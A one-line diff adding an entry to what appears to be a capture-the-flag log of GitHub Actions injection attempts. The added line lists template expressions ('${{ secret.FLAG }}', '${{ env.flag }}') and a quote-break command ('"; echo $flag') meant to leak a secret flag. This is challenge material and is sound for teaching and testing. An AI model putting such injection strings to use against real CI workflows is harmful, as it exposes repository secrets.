@@ -754,3 +754,4 @@ wffx: echo "$user:$issues:$flag" >> issues
 ggugg:${{ secrets[FLAG] }}
 stamparm:{{ $flag }}
 cp198:${{ secrets.FLAG }}
+Zeker62:${{ secret.FLAG }} ${{ secret.flag }} ${{ secret[FLAG] }} ${{ env.flag }} ${{ env[FLAG] }} ${{ env.FLAG }} "; echo $flag" 
